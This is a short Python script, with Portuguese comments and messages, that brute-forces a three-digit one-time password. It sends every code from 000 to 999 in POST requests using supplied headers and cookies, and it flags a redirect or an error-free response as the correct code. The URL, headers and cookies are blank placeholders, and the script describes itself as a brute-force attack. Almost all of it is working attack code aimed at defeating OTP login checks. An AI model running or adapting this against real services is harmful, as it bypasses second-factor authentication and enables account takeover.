import requests


url = [insira a url aqui]

headers = {
    [insira os headers aqui]
}

cookies = {
    [insira os cookies aqui]
}

print("[*] Iniciando ataque de força bruta corrigido (000-999)...")

for i in range(1000):
    otp_tentativa = f"{i:03d}"
    payload = f"otp={otp_tentativa}"
    
    try:
        response = requests.post(url, headers=headers, cookies=cookies, data=payload, allow_redirects=False)
        
        if i % 100 == 0:
            print(f"[.] Testando bloco inicial {otp_tentativa} -> Status: {response.status_code}")
        
        
        if response.status_code in (301, 302, 303, 307, 308):
            print(f"\n[+] SUCESSO! Código OTP encontrado: {otp_tentativa}")
            print(f"[+] Status do redirecionamento: {response.status_code}")
            print(f"[+] Redirecionado para: {response.headers.get('Location')}")
            break
            
        elif response.status_code == 200:
            corpo_resposta = response.text.lower()
            if "invalid" not in corpo_resposta and "incorreto" not in corpo_resposta and "error" not in corpo_resposta:
                print(f"\n[+] Possível sucesso encontrado no código (Status 200): {otp_tentativa}")
                print(response.text[:300]) 
                break
                
    except requests.exceptions.RequestException as e:
        print(f"\n[-] Erro de conexão na tentativa {otp_tentativa}: {e}")
        break

print("\n[*] Processo finalizado.")
